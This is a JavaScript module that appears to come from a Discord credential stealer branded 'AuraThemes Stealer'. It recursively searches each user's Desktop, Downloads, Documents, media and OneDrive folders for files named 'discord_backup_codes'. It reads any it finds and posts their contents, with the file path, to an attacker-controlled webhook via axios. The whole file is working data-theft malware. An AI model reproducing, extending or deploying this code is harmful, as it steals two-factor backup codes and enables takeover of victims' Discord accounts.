const { getUsers } = require('../../utils/harware.js');
const FormData     = require('form-data');
const axios        = require('axios');
const path         = require('path');
const fs           = require('fs');

module.exports = async (webhook) => {
    const users = await getUsers();
    const directories = [
        'Desktop',
        'Downloads',
        'Documents',
        'Videos',
        'Pictures',
        'Music',
        'OneDrive'
    ];

    for (const user of users) {
        for (const dir of directories) {
            const fullPath = path.join(user, dir);

            if (!fs.existsSync(fullPath)) {
                continue;
            }

            await searchFiles(fullPath, webhook)
        }
    }
}

function searchFiles(dir, webhook) {
    return new Promise((resolve, reject) => {
        fs.readdir(dir, (err, files) => {
            if (err) {
                resolve(false);
                return;
            }

            const tasks = files.map(file => {
                const filePath = path.join(dir, file);

                return new Promise((resolve, reject) => {
                    fs.stat(filePath, (err, stats) => {
                        if (err) {
                            resolve(false);
                            return;
                        }

                        if (stats.isFile()) {
                            if (stats.size <= 2 * 1024 * 1024 && file.startsWith('discord_backup_codes')) {
                                fs.readFile(filePath, 'utf8', async (err, data) => {
                                    if (err) {
                                        console.error('Error reading file:', err);
                                        resolve(false);
                                        return;
                                    }

                                    const payload = {
                                        avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
                                        username: 'AuraThemes Stealer - Codes',
                                        content: `\`${filePath}\``,
                                        embeds: [
                                            {
                                                title: 'Discord Backup Codes',
                                                color: "12740607",
                                                description: `\`\`\`yml\n${data.length === 0 ? 'Not found' : data}\n\`\`\``,
                                                timestamp: new Date(),
                                                footer: {
                                                    text: 'AuraThemes Stealer | Injection',
                                                    icon_url: 'https://i.imgur.com/yVnOSeS.gif'
                                                }
                                            }
                                        ]
                                    };

                                    try {
                                        const form = new FormData();
                                        form.append('payload_json', JSON.stringify(payload));

                                        await axios.post(webhook, form, {
                                            headers: {
                                                ...form.getHeaders()
                                            }
                                        });
                                        resolve(true);
                                    } catch (error) {
                                        console.error("Could not send codes with webhook:", error);
                                        resolve(false);
                                    }
                                });
                            } else {
                                resolve(false);
                            }
                        } else if (stats.isDirectory()) {
                            searchFiles(filePath, webhook).then(resolve).catch(reject);
                        } else {
                            resolve(false);
                        }
                    });
                });
            });

            Promise.all(tasks).then(results => {
                resolve(results.some(result => result));
            }).catch(reject);
        });
    });
}